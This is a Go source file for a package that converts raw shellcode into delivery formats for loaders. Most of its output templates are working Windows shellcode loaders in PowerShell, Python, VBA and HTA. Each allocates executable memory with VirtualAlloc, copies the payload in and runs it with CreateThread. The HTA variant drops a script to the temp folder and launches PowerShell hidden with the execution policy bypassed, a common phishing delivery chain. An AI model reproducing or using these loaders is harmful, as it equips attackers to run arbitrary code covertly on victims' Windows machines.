// Package shellcode converts raw shellcode bytes into the common delivery
// formats used by loaders (C array, C#, PowerShell, VBA, ...). Pure Go, no
// platform dependencies.
package shellcode

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
)

// Format enumerates supported output formats.
type Format string

const (
	FormatRaw        Format = "raw"        // raw bytes (returned as []byte)
	FormatBase64     Format = "b64"        // base64 string
	FormatCArray     Format = "c"          // C unsigned char array
	FormatCSharp     Format = "csharp"     // C# byte[] literal
	FormatPowerShell Format = "powershell" // PowerShell byte array
	FormatPython     Format = "python"     // Python bytes
	FormatVBA        Format = "vba"        // VBA Byte array
	FormatHTA        Format = "hta"        // embedded VBScript base64 + PowerShell
)

// SupportedFormats lists all formats for the UI.
func SupportedFormats() []Format {
	return []Format{FormatRaw, FormatBase64, FormatCArray, FormatCSharp, FormatPowerShell, FormatPython, FormatVBA, FormatHTA}
}

// Convert renders shellcode into the requested format. For FormatRaw it
// returns the bytes wrapped in a string; all other formats are text.
func Convert(data []byte, f Format) (string, error) {
	switch f {
	case FormatRaw:
		return string(data), nil
	case FormatBase64:
		return base64.StdEncoding.EncodeToString(data), nil
	case FormatCArray:
		return toCArray(data), nil
	case FormatCSharp:
		return toCSharp(data), nil
	case FormatPowerShell:
		return toPowerShell(data), nil
	case FormatPython:
		return toPython(data), nil
	case FormatVBA:
		return toVBA(data), nil
	case FormatHTA:
		return toHTA(data), nil
	default:
		return "", fmt.Errorf("unsupported format: %s", f)
	}
}

func toCArray(data []byte) string {
	var b strings.Builder
	b.WriteString("unsigned char payload[] = {")
	for i, c := range data {
		if i%12 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n};")
	return b.String()
}

func toCSharp(data []byte) string {
	var b strings.Builder
	b.WriteString("byte[] buf = new byte[")
	b.WriteString(fmt.Sprintf("%d] {", len(data)))
	for i, c := range data {
		if i%13 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n};")
	return b.String()
}

func toPowerShell(data []byte) string {
	var b strings.Builder
	b.WriteString("$payload = @(")
	for i, c := range data {
		if i%14 == 0 {
			b.WriteString("\n  ")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n)\n")
	b.WriteString(`$code = [Byte[]]$payload
Add-Type -Namespace W -Name M -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr a, UIntPtr s, IntPtr f, IntPtr p, uint x, IntPtr i);
"@
$ptr = [W.M]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
[W.M]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null`)
	return b.String()
}

func toPython(data []byte) string {
	return "buf = b'" + base64.StdEncoding.EncodeToString(data) + "'\n" +
		"import base64, ctypes\n" +
		"buf = base64.b64decode(buf)\n" +
		"ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)\n" +
		"ctypes.memmove(ptr, buf, len(buf))\n" +
		"ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)"
}

func toVBA(data []byte) string {
	var b strings.Builder
	b.WriteString("Private Declare PtrSafe Sub RtlMoveMemory Lib \"kernel32\" (ByVal dest As LongPtr, ByRef src As Any, ByVal n As Long)\n")
	b.WriteString("Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAlloc As Long, ByVal flProtect As Long) As LongPtr\n")
	b.WriteString("Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal lpAttr As LongPtr, ByVal dwStack As Long, ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, ByVal dwFlags As Long, ByVal lpId As LongPtr) As LongPtr\n\n")
	b.WriteString("Sub p()\n  Dim buf(0 To ")
	b.WriteString(fmt.Sprintf("%d", len(data)-1))
	b.WriteString(") As Byte\n")
	for i := 0; i < len(data); i += 30 {
		b.WriteString("  ")
		end := i + 30
		if end > len(data) {
			end = len(data)
		}
		for j := i; j < end; j++ {
			b.WriteString(fmt.Sprintf("buf(%d) = &H%02X: ", j, data[j]))
		}
		b.WriteString("\n")
	}
	b.WriteString("  Dim p As LongPtr\n  p = VirtualAlloc(0, UBound(buf), 0x3000, 0x40)\n  RtlMoveMemory p, buf(0), UBound(buf)\n  CreateThread 0, 0, p, 0, 0, 0\nEnd Sub")
	return b.String()
}

func toHTA(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	// The embedded PowerShell loader is built line-by-line to avoid literal
	// backticks (which would terminate Go string literals).
	ps := []string{
		"$code = [System.Convert]::FromBase64String('" + b64 + "')",
		"Add-Type -Namespace W -Name M -MemberDefinition @'",
		`[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);`,
		`[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr f,IntPtr p,uint x,IntPtr i);`,
		"'@",
		"$p=[W.M]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]$code.Length,0x3000,0x40)",
		"[Runtime.InteropServices.Marshal]::Copy($code,0,$p,$code.Length)",
		"[W.M]::CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,$p,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null",
	}
	return "<html>\n<script language=\"VBScript\">\n" +
		"Set fso = CreateObject(\"Scripting.FileSystemObject\")\n" +
		"Set tmp = fso.GetSpecialFolder(2)\n" +
		"Set f = fso.CreateTextFile(tmp & \"\\p.ps1\", True)\n" +
		"f.Write \"" + strings.Join(ps, "\" & vbCrLf & \"") + "\"\n" +
		"f.Close\n" +
		"CreateObject(\"WScript.Shell\").Run \"powershell -ep bypass -w hidden -f \" & tmp & \"\\p.ps1\", 0, False\n" +
		"</script>\n</html>"
}

// Hex returns a hex dump of the shellcode (diagnostics / integrity checks).
func Hex(data []byte) string {
	return hex.EncodeToString(data)
}
